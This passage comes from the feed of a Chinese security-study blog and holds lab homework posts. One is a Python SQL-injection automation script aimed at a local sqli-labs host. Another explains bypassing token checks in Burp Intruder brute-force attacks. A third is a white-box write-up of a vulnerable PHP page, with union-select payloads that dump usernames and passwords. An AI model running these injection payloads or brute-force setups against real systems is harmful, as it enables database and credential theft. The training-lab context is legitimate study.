class="line">        xiabiao = chaxianshiweiqingqiu(strings, liebiao)</span><br><span class="line"></span><br><span class="line">        if not xiabiao:</span><br><span class="line">            continue</span><br><span class="line">        xunhuanziduan = len(liebiao)</span><br><span class="line">        print len(liebiao)</span><br><span class="line">        print &quot;12345&quot;</span><br><span class="line">        for i in range(len(xiabiao)):</span><br><span class="line">            print &quot;&#123;&#125;&quot;.format(xiabiao[i]),</span><br><span class="line"></span><br><span class="line">    return xiabiao</span><br><span class="line"></span><br><span class="line"># 在这里取出爆破出的数据</span><br><span class="line">def zongchaxun(ChuShi_url):</span><br><span class="line">    shuju = requests.get(url=ChuShi_url)</span><br><span class="line">    r = r&quot;\*&#123;3&#125;([^,]*)\*&#123;3&#125;&quot;</span><br><span class="line"></span><br><span class="line">    CXlist = re.findall(r, shuju.text)</span><br><span class="line">    for i in range(len(CXlist)):</span><br><span class="line">        CXlist[i] = str(CXlist[i])</span><br><span class="line">    return CXlist</span><br><span class="line"></span><br><span class="line"># 在这里拼接所有的PlayLoad</span><br><span class="line">def pingjiePL(yuju):</span><br><span class="line">    global start_url, jieduan, xunhuanziduan, xiabiao</span><br><span class="line">    chushi_url = start_url + jieduan[0] + &quot; and 1=2&quot; + &quot; union select &quot;</span><br><span class="line">    for i in range(int(xunhuanziduan)):</span><br><span class="line">        if i == xiabiao[0]:</span><br><span class="line">            chushi_url += yuju</span><br><span class="line">        else:</span><br><span class="line">            chushi_url += str(i)</span><br><span class="line">            ChuShi_url = chushi_url</span><br><span class="line">            chushi_url += &apos;,&apos;</span><br><span class="line">    print &apos;\n&apos;,</span><br><span class="line">    ChuShi_url += &quot; &quot; + jieduan[1]</span><br><span class="line">    print ChuShi_url</span><br><span class="line">    list = zongchaxun(ChuShi_url)</span><br><span class="line">    return list</span><br><span class="line"></span><br><span class="line"># 开始暴库</span><br><span class="line">def baoku():</span><br><span class="line">    global start_url, xunhuanziduan, xiabiao</span><br><span class="line">    global jieduan</span><br><span class="line">    yuju = &quot;(select group_concat(&apos;***&apos;,schema_name,&apos;***,&apos;) from information_schema.schemata),&quot;</span><br><span class="line">    playload_ku = pingjiePL(yuju)</span><br><span class="line">    if playload_ku:</span><br><span class="line">        print &quot;网站数据库有:&quot;</span><br><span class="line">        for i in playload_ku:</span><br><span class="line">            print i</span><br><span class="line">        return playload_ku</span><br><span class="line">    else:</span><br><span class="line">        print &quot;网站没有数据库&quot;</span><br><span class="line"></span><br><span class="line"># 开始爆表</span><br><span class="line">def baobiao():</span><br><span class="line">    global start_url, xunhuanziduan, xiabiao, table_schema</span><br><span class="line">    global jieduan</span><br><span class="line"></span><br><span class="line">    yuju = &quot;(select group_concat(&apos;***&apos;,table_name,&apos;***,&apos;) from information_schema.tables where table_schema=&apos;&quot; + table_schema + &quot;\&apos;),&quot;</span><br><span class="line">    playload_tables = pingjiePL(yuju)</span><br><span class="line"></span><br><span class="line">    if playload_tables:</span><br><span class="line">        print  &quot;&#123;&#125;数据库有如下表:&quot;.format(table_schema)</span><br><span class="line">        for i in playload_tables:</span><br><span class="line">            print i</span><br><span class="line">        return playload_tables</span><br><span class="line">    else:</span><br><span class="line">        print &quot;&#123;&#125;没有表&quot;.format(table_schema)</span><br><span class="line"></span><br><span class="line"># 开始爆字段</span><br><span class="line">def baoziduan():</span><br><span class="line">    global start_url, xunhuanziduan, table_schema, xiabiao, table_name</span><br><span class="line">    global jieduan</span><br><span class="line"></span><br><span class="line">    yuju = &quot;(select group_concat(&apos;***&apos;,column_name,&apos;***,&apos;) from information_schema.columns where table_name=&apos;&#123;&#125;&apos; and table_schema=&apos;&#123;&#125;&apos;),&quot;.format(</span><br><span class="line">        table_name, table_schema)</span><br><span class="line"></span><br><span class="line">    playload_columns = pingjiePL(yuju)</span><br><span class="line">    print len(playload_columns)</span><br><span class="line">    if playload_columns:</span><br><span class="line">        print  &quot;&#123;&#125;数据库有如下字段:&quot;.format(table_name)</span><br><span class="line">        for i in playload_columns:</span><br><span class="line">            print i</span><br><span class="line">        return playload_columns</span><br><span class="line">    else:</span><br><span class="line">        print &quot;&#123;&#125;没有字段&quot;.format(table_name)</span><br><span class="line"></span><br><span class="line"># 开始爆数据</span><br><span class="line">def baoshuju():</span><br><span class="line">    global xunhuanziduan, table_name, table_schema, xiabiao, column_name</span><br><span class="line">    global start_url</span><br><span class="line">    global jieduan</span><br><span class="line"></span><br><span class="line">    yuju = &quot;(select group_concat(&quot;</span><br><span class="line">    yuju_One = yuju</span><br><span class="line"></span><br><span class="line">    for i in range(len(column_name)):</span><br><span class="line">        yuju_One += &quot;&apos;***&apos;,&#123;&#125;,&apos;***,&apos;&quot;.format(column_name[i])</span><br><span class="line">        yuju = yuju_One</span><br><span class="line">        yuju_One += &apos;,&apos;</span><br><span class="line">    yuju += &quot;) from &#123;&#125;.&#123;&#125;),&quot;.format(table_schema, table_name)</span><br><span class="line"></span><br><span class="line">    playload_shuju = pingjiePL(yuju)</span><br><span class="line"></span><br><span class="line">    for i in range(len(playload_shuju)):</span><br><span class="line">        if i % len(column_name) == 0:</span><br><span class="line">            print &apos;\n&apos;,</span><br><span class="line">        print playload_shuju[i],&apos;::&apos;,</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    global start_url, ziduan, xiabiao, jieduan, table_schema, table_name, column_name, xunhuanziduan</span><br><span class="line">    start_url = &quot;http://192.168.107.128/sqli/Less-1/?id=1&quot;</span><br><span class="line"></span><br><span class="line">    jieduan = testsql()  # 截断字符</span><br><span class="line">    print &quot;总的截断为&#123;&#125;&quot;.format(jieduan)</span><br><span class="line">    ziduan = chaziduan()  # 有多少显示位</span><br><span class="line">    print ziduan</span><br><span class="line">    print &apos;1111111&apos;</span><br><span class="line">    xiabiao = chaxianshiwei()  # 显示位下标</span><br><span class="line">    print &quot;可显示下标为&#123;&#125;&quot;.format(xiabiao)</span><br><span class="line">    print &quot;有&#123;&#125;位显示位&quot;.format(xunhuanziduan)</span><br><span class="line">    playload_ku = baoku()  # 爆出的数据库</span><br><span class="line"></span><br><span class="line">    table_schema = raw_input(&quot;请输入要爆的数据库名&quot;)</span><br><span class="line"></span><br><span class="line">    playload_tables = baobiao()  # 爆出的表</span><br><span class="line"></span><br><span class="line">    table_name = &quot;servers&quot;</span><br><span class="line"></span><br><span class="line">    playload_columns = baoziduan()  # 爆出的字段</span><br><span class="line"></span><br><span class="line">    column_name = playload_columns</span><br><span class="line"></span><br><span class="line">    playload_shuju = baoshuju()  # 爆出的数据</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;此脚本能实现最基础的联合查询注入。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>burp绕过token验证</title>
    <link href="https://0xxk.github.io/2019/08/21/burp%E7%BB%95%E8%BF%87token%E9%AA%8C%E8%AF%81/"/>
    <id>https://0xxk.github.io/2019/08/21/burp绕过token验证/</id>
    <published>2019-08-21T13:55:46.075Z</published>
    <updated>2019-08-21T14:38:53.722Z</updated>
    
    <content type="html"><![CDATA[<p>绕过</p><a id="more"></a><p><strong>BurpSuite intruder attack-type 4</strong>种爆破模式：</p><p>Sniper 单参数爆破，多参数时同一个字典按顺序替换各参数，总之初始值有一个参数不变</p><p>Battering ram 多参数同时爆破，但用的是同一个字典</p><p>Pichfork 多参数同时爆破，但用的是不同的字典</p><p>Cluster bamb 多参数做笛卡尔乘积模式爆破</p><p><strong>关于token:</strong></p><p>token主要用来防御csrf，而无法防止暴力破解，这是因为将一个随机产生的token加入请求之后，每次请求token都会改变，csrf攻击者只能窃取受害者的cookie却不能伪造当次请求的token，token无法防止暴力破解的原因是token每次都会随页面返回到前端，攻击者只要想办法自动化获得前端的token即可进行暴力破解攻击。</p><p>抓包后发现有token参数</p><p>将Attack type更改为Pichfork，即多参数同时爆破，使用不同的字典</p><p>将username,password,token设置为变量，并分别为前两个变量设置字典</p><p>对于第三个参数，在option中找到grep -Extract然后点击add</p><p>Grep -Extract:这个设置能够被用来通过请求返回的信息来获取有用的信息供你使用。也就是说，可以通过它来获得每次请求后返回的token，关联到payload中进行暴力破解。</p><p>点击fetch response，查找token，找到token值所在位置</p><p>点击OK   这里勾上</p><p>将第二个变量的Payload type选择成Recursive grep,下面自动出现刚刚选中的信息。</p><p>最后将下面的always勾选上</p><p>这样就设置完毕了，需要注意的是burp的Pichfork爆破模式只能进行单线程的</p><p>爆破，因此将线程改为1</p><p>这时候就爆破成功了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;绕过&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HTTP基础</title>
    <link href="https://0xxk.github.io/2019/08/21/HTTP%E5%9F%BA%E7%A1%80/"/>
    <id>https://0xxk.github.io/2019/08/21/HTTP基础/</id>
    <published>2019-08-21T12:42:51.003Z</published>
    <updated>2019-08-21T14:39:58.852Z</updated>
    
    <content type="html"><![CDATA[<p>作业</p><a id="more"></a><h1 id="一-HTTP协议"><a href="#一-HTTP协议" class="headerlink" title="一.HTTP协议"></a><strong>一.HTTP协议</strong></h1><p>HTTP协议是超文本传输协议，基于TCP/IP通信协议来传递数据，是一个属于应用层的面向对象的协议。常用状态码</p><table><thead><tr><th align="center">状态码</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">200 OK</td><td align="center">从客户端发来的请求在服务器端被正常处理</td></tr><tr><td align="center">204 No Content</td><td align="center">服务器接收的请求已成功处理，但在返回响应报文中不含实体的主体部分</td></tr><tr><td align="center">301 Moved Permanently</td><td align="center">永久性重定向</td></tr><tr><td align="center">302 Found</td><td align="center">临时性重定向</td></tr><tr><td align="center">304 Not Modified</td><td align="center">客户端发送附带条件请求时，服务器端允许请求访问资源，但未满足条件的情况</td></tr><tr><td align="center">400 Bad Request</td><td align="center">请求报文中存在语法错误</td></tr><tr><td align="center">403 Forbidden</td><td align="center">对请求资源的访问被服务器拒绝</td></tr><tr><td align="center">404 Not Found</td><td align="center">服务器上无法找到请求的资源</td></tr><tr><td align="center">500 lnternal Server Error</td><td align="center">服务器端在执行请求时发生了错误</td></tr></tbody></table><h1 id="二-HTTP-URL"><a href="#二-HTTP-URL" class="headerlink" title="二.HTTP URL"></a><strong>二.HTTP URL</strong></h1><p>URL,中文叫做统一资源定位符，是互联网上用来表示某一处资源的地址。</p><p>以下面这个URL为例，介绍下普通URL的各部分组成：<br><a href="http://www.asp.com:8080/news/index.asp?boardID=5&ID=24618&page=1#name" target="_blank" rel="noopener">http  ://    www.asp.com: 8080       /news      /index.asp?    boardID=5&amp;ID=24618&amp;page=1#  name</a>协议部分       域名部分     端口部分    虚拟目录部分   文件名部分              参数部分          锚部分</p><p>HTTP之请求方法</p><p>根据HTTP标准，HTTP请求可以使用多种请求方法。</p><table><thead><tr><th align="center">HTTP1.0</th><th align="center">HTTP1.1</th></tr></thead><tbody><tr><td align="center">GET,POST,HEAD</td><td align="center">GET,POST,HEADOPTIONS,PUT,DELETE,TRACE,CONNECT</td></tr></tbody></table><p>描述</p><table><thead><tr><th>序号</th><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>GET</td><td>请求指定的页面信息，并返回实体主体。</td></tr><tr><td>2</td><td>HEAD</td><td>类似于GET请求，只不过返回的响应中没有具体的内容，用于获取报头。</td></tr><tr><td>3</td><td>POST</td><td>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有的资源的修改。</td></tr><tr><td>4</td><td>PUT</td><td>从客户端向服务器传送的数据取代指定的文档的内容。</td></tr><tr><td>5</td><td>DELETE</td><td>请求服务器删除指定的特面。</td></tr><tr><td>6</td><td>CONNECT</td><td>HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td></tr><tr><td>7</td><td>OPTIONS</td><td>允许客户端查看服务器的性能。</td></tr><tr><td>8</td><td>TRACE</td><td>回显服务器收到的请求，主要用于测试或诊断。</td></tr><tr><td>9</td><td>PATCH</td><td>是对PUT方法的补充，用来对已知资源进行局部更新。</td></tr></tbody></table><h1 id="三-计算机网络模型基础"><a href="#三-计算机网络模型基础" class="headerlink" title="三.计算机网络模型基础"></a><strong>三.计算机网络模型基础</strong></h1><p>OSI模型总共分为七层，从下到上分别是：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。每层基本协议如下图所示：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/8.21网络神图.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h1 id="四-http协议中，常见头部字段信息的含义（请求头和响应头）"><a href="#四-http协议中，常见头部字段信息的含义（请求头和响应头）" class="headerlink" title="四.http协议中，常见头部字段信息的含义（请求头和响应头）"></a><strong>四.http协议中，常见头部字段信息的含义（请求头和响应头）</strong></h1><p><strong>Request</strong></p><p><strong>第一部分：请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本.</strong></p><p><strong>第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息</strong></p><p>从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等</p><p><strong>第三部分：空行，请求头部后面的空行是必须的</strong></p><p>即使第四部分的请求数据为空，也必须有空行。</p><p><strong>第四部分：请求数据也叫主体，可以添加任意的其他数据。</strong></p><p>这个例子的请求数据为空。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /index.asp HTTP/1.1    请求行，说明请求类型,要访问的资源以及所使用的HTTP版本</span><br><span class="line">Host                       请求地址</span><br><span class="line">User-Agent                 浏览器信息</span><br><span class="line">Accept                     设置接收文件的类型</span><br><span class="line">Referer                    请求当前页面的前一个地址</span><br><span class="line">Accept-Encoding            设置接收的编码类型</span><br><span class="line">Accept-Language            设置接收的语言</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP1.1</span><br><span class="line">Host:</span><br><span class="line">User-Agent:</span><br><span class="line">Content-Type:                                   内容MIME类型</span><br><span class="line">Content-Length:                                 内容长度</span><br><span class="line">Connection: Keep-Alive                          控制不再转发给代理的首部字段、管理持久连接</span><br><span class="line">                                                空行</span><br><span class="line">name=Professional%20Ajax&amp;publisher=Wiley        数据内容</span><br></pre></td></tr></table></figure><h4 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h4><h5 id="HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。"><a href="#HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。" class="headerlink" title="HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。"></a>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</h5><h5 id="第一部分：状态行，由HTTP协议版本号，-状态码，-状态消息-三部分组成。"><a href="#第一部分：状态行，由HTTP协议版本号，-状态码，-状态消息-三部分组成。" class="headerlink" title="第一部分：状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。"></a>第一部分：状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。</h5><h5 id="第二部分：消息报头，用来说明客户端要使用的一些附加信息"><a href="#第二部分：消息报头，用来说明客户端要使用的一些附加信息" class="headerlink" title="第二部分：消息报头，用来说明客户端要使用的一些附加信息"></a>第二部分：消息报头，用来说明客户端要使用的一些附加信息</h5><h5 id="第三部分：空行，消息报头后面的空行是必须的"><a href="#第三部分：空行，消息报头后面的空行是必须的" class="headerlink" title="第三部分：空行，消息报头后面的空行是必须的"></a>第三部分：空行，消息报头后面的空行是必须的</h5><h5 id="第四部分：响应正文，服务器返回给客户端的文本信息。"><a href="#第四部分：响应正文，服务器返回给客户端的文本信息。" class="headerlink" title="第四部分：响应正文，服务器返回给客户端的文本信息。"></a>第四部分：响应正文，服务器返回给客户端的文本信息。</h5><p>空行后面的html部分为响应正文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection:                     </span><br><span class="line">Date:                       生成响应的日期和时间</span><br><span class="line">Server: Microsoft-IIS/6.0   服务器信息</span><br><span class="line">Content-Length: 31821       相应内容长度</span><br><span class="line">Content-Type: text/html     MIME类型的HTML(text/html)</span><br><span class="line">Set-Cookie: ASPSESSIONIDSCAQRATR=IEDHHFPBCGDOOFHJKPKCKPOC; path=/   发给客户端的，在根目录下</span><br><span class="line">Cache-control: private      指定了请求和响应遵循的缓存机制</span><br><span class="line">                            空行</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot;&gt;  ----- 【响应正文】</span><br><span class="line">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;ÍøÕ¾Ê×Ò³-ÂÌÃË¿Æ¼¼--¾ÞÈË±³ºóµÄ×¨¼Ò&lt;/TITLE&gt;</span><br><span class="line">&lt;META http-equiv=Content-Type content=&quot;text/html; charset=gb2312&quot;&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;imgbye/Styles.css&quot;&gt;</span><br><span class="line">&lt;META content=ÂÌÃË¿Æ¼¼--¾ÞÈË±³ºóµÄ×¨¼Ò name=keywords&gt;</span><br><span class="line">&lt;META content=ÂÌÃË¿Æ¼¼--¾ÞÈË±³ºóµÄ×¨¼Ò name=description&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">&lt;!--</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作业&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://0xxk.github.io/2019/08/20/8.20%E4%BD%9C%E4%B8%9A/"/>
    <id>https://0xxk.github.io/2019/08/20/8.20作业/</id>
    <published>2019-08-20T10:53:55.428Z</published>
    <updated>2019-08-21T14:36:44.462Z</updated>
    
    <content type="html"><![CDATA[<p></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;                                                                                                                                         
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>8.13注入白黑盒测试</title>
    <link href="https://0xxk.github.io/2019/08/13/8.13%E6%B3%A8%E5%85%A5%E7%99%BD%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    <id>https://0xxk.github.io/2019/08/13/8.13注入白黑盒测试/</id>
    <published>2019-08-13T14:08:41.430Z</published>
    <updated>2019-08-13T14:12:43.784Z</updated>
    
    <content type="html"><![CDATA[<p>在这里可以进行白盒or黑盒，就此对两种方法都进行说明。</p><a id="more"></a><h1 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h1><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">        @$con = mysql_connect(<span class="string">'127.0.0.1'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">        mysql_select_db(<span class="string">'mysql'</span>);</span><br><span class="line">        @$q = $_POST[<span class="string">'sql'</span>];</span><br><span class="line">        $sql = <span class="string">'SELECT * FROM `mysql`.`user` WHERE `user` = \'root\' '</span> . $q; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"将执行了sql语句: &#123;$sql&#125;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">        $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">            $arr = mysql_fetch_array($res);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"查询的结果为:&lt;br&gt;&lt;br&gt;&lt;tr&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span> . $arr[<span class="number">0</span>] . <span class="string">"&lt;/td&gt;&lt;td&gt;"</span> . $arr[<span class="number">1</span>] . <span class="string">"&lt;/td&gt;&lt;td&gt;"</span> . $arr[<span class="number">2</span>] . <span class="string">"&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="mysql-fetch-array-函数"><a href="#mysql-fetch-array-函数" class="headerlink" title="mysql_fetch_array()函数"></a>mysql_fetch_array()函数</h2><p>定义如下：</p><p>​        mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有</p><p>返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p><p>​        大致就是将查询到的值以$arr[m]=xx这样的关联数组形式展示出来，且只显示第一行。但关联数组查询的数据会在接下来的行中显示。因此可以使用and 1=2使前面查询不到，就此我们关联查询的就可以显示出来。或者使用limit1,1将第二行读取出来。</p><h2 id="三个回显位"><a href="#三个回显位" class="headerlink" title="三个回显位"></a>三个回显位</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;td&gt;&quot; . $arr[0] . &quot;&lt;/td&gt;&lt;td&gt;&quot; . $arr[1] . &quot;&lt;/td&gt;&lt;td&gt;&quot; . $arr[2] . &quot;&lt;/td&gt;&lt;/tr&gt;&quot;;</span><br></pre></td></tr></table></figure><p>在网页上共输出了$arr[0],$arr[1],$arr[2]这三个数组，由此可以得知：我们在关联查询时只能在前三位查询，否则即使查询到数据，也不会回显出来。</p><h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@$q = $_POST[<span class="string">'sql'</span>]; </span><br><span class="line"><span class="string">'SELECT * FROM `mysql`.`user` WHERE `user` = \'root\' '</span> . $q;</span><br></pre></td></tr></table></figure><p>在这里接收一个$q参数，并且用.将$q和前面的语句结合在一起。查询语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; $q;</span><br></pre></td></tr></table></figure><p>因此在这里可以看作“数字型”注入（原理像，请百度），就此直接在后面拼接上语句即可。</p><h2 id="注入参数流程"><a href="#注入参数流程" class="headerlink" title="注入参数流程"></a>注入参数流程</h2><h3 id="查找字段数"><a href="#查找字段数" class="headerlink" title="查找字段数"></a>查找字段数</h3><p>老方法，既然没有过滤任何关键字。那直接使用二分法排序查询字段数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先order by 30，可以看到有30个字段</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/8.13注入1.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在使用order by 50，发现页面发生了变化。证明没有50个字段</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/8.13注入2.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就此发现原来是49个字段</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/8.13注入3.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>因为白盒审计已经知道前三位回显，接下来就可以使用基础语法去查询了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select x,x,x,4,5,6,7,8,9,,,,,,47,48,49</span><br></pre></td></tr></table></figure><h3 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h3><p>首先看一下关联数组时会用到的数组！</p><p>group_concat()函数</p><p>将所有查询到的数据都放在一起输出。如总共有10行，都放在一行输出。为什么要这样呢？因为前面用到了mysql_fetch_array()函数，只会读取一行。所以要将数据放在一行中进行读取。</p><p>查询数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,(select group_concat(schema_name) from information_schema.schemata),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/8.13查询数据库.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="查询表"><a href="#查询表" class="headerlink" title="查询表"></a>查询表</h3><p>常规操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;ceshi&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/8.13查询表.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h3><p>查询ceshi库content表中的字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,(select group_concat(ip,&apos;:&apos;,time) from ceshi.content),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/8.13查询字段1.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>查询ceshi库users表中的字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,(select group_concat(column_name,&apos;::&apos;) from information_schema.COLUMNS where TABLE_NAME=&apos;users&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/8.13查询字段2.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><p>查询users表中username 和 passwd的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,(select group_concat(username,&apos;:&apos;,passwd) from ceshi.users),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49</span><br></pre></td></tr></table></figure><p>查询数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/8.13数据.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h1 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h1><p>不想写了嗷，洗衣服去了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在这里可以进行白盒or黑盒，就此对两种方法都进行说明。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>新闻作业</title>
    <link href="https://0xxk.github.io/2019/08/12/%E6%96%B0%E9%97%BB%E7%95%8C%E9%9D%A28.10%E5%91%A8%E6%9C%AB%E4%BD%9C%E4%B8%9A/"/>
    <id>https://0xxk.github.io/2019/08/12/新闻界面8.10周末作业/</id>
    <published>2019-08-12T09:51:17.770Z</published>
    <updated>2019-08-13T06:22:18.071Z</updated>
    
